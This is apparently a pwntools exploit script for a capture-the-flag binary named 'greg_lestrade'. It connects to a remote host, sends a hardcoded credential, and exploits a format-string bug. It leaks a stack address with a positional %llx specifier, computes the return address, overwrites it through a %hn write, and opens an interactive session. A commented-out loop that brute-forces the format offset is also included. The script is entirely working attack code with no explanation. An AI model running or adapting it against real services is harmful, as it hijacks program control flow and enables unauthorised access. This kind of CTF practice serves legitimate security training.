from pwn import *

#context.log_level = "error"
HOST = "146.185.132.36"
PORT = 12431
conn = remote(HOST, PORT)

#find offset
#for i in range(1, 1000):
#    print(i)
#    conn = process("./greg_lestrade")
#    conn.sendafter("Credential : ", "7h15_15_v3ry_53cr37_1_7h1nk")
#    conn.sendlineafter("1) admin action", "1")
#    payload = "A" * 8
#    payload += "%%%d$llx" % i 
#    payload += "B" * (0xff - len(payload))
#    conn.sendafter("Give me your command : ", payload)
#    conn.recvuntil("A" * 8)
#    print(conn.recvuntil("B")[:-1])
#    conn.close()

#139 return address
#conn = process("./greg_lestrade")
conn.sendafter("Credential : ", "7h15_15_v3ry_53cr37_1_7h1nk")
conn.sendlineafter("1) admin action", "1")
payload = "A" * 8
payload += "%138$llx" 
payload += "B" * (0xff - len(payload))
conn.sendafter("Give me your command : ", payload)
conn.recvuntil("A" * 8)
RET_ADDR = int(conn.recvuntil("B")[:-1], 16) - 0x68
#offset 8
conn.sendlineafter("1) admin action", "1")
payload = "%%%dx" %  0x876
payload += "%40$hn" 
payload += "B" * (0xff - len(payload)) + "\x00" 
payload += p64(RET_ADDR)
conn.sendafter("Give me your command : ", payload)
conn.interactive()
